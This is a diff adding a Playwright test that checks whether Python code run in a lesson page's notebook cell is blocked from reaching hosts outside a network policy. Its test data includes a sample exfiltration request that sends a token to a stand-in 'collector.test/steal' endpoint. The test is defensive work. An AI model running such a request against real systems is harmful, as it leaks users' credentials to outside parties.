@@ -52,3 +52,40 @@ test('a violation in the page is reported, so the check above can fail', async (
   });
   await expect.poll(() => violations.length).toBeGreaterThan(0);
 });
+
+const SENDING_CODE = [
+  'from pyodide.http import open_url',
+  'for url in ["https://collector.test/steal?token=abc", "https://identitytoolkit.googleapis.com/probe"]:',
+  '    try:',
+  '        open_url(url)',
+  '        print("sent", url)',
+  '    except BaseException:',
+  '        print("failed", url)',
+].join('\n');
+
+test('code in a cell cannot send data to a server the policy does not allow', async ({
+  page,
+  context,
+}) => {
+  const reached: string[] = [];
+  await context.route(/collector\.test|identitytoolkit\.googleapis\.com/, (route) => {
+    reached.push(new URL(route.request().url()).hostname);
+    return route.fulfill({
+      status: 200,
+      headers: { 'access-control-allow-origin': '*' },
+      body: '',
+    });
+  });
+  await page.goto('/lessons/functions');
+  const cell = page.locator('[data-cell-id="sum-three-try"]');
+  await expect(cell.locator('button.run')).toBeEnabled({ timeout: 45_000 });
+  await cell.locator('textarea').fill(SENDING_CODE);
+  await cell.locator('button.run').click();
+  await expect(cell.locator('.output')).toContainText('identitytoolkit.googleapis.com/probe');
+
+  expect(reached, 'an allowed host is reached, so worker requests can be seen').toContain(
+    'identitytoolkit.googleapis.com',
+  );
+  expect(reached, 'a host outside the policy is never reached').not.toContain('collector.test');
+  await expect(cell.locator('.output')).toContainText('failed https://collector.test');
+});
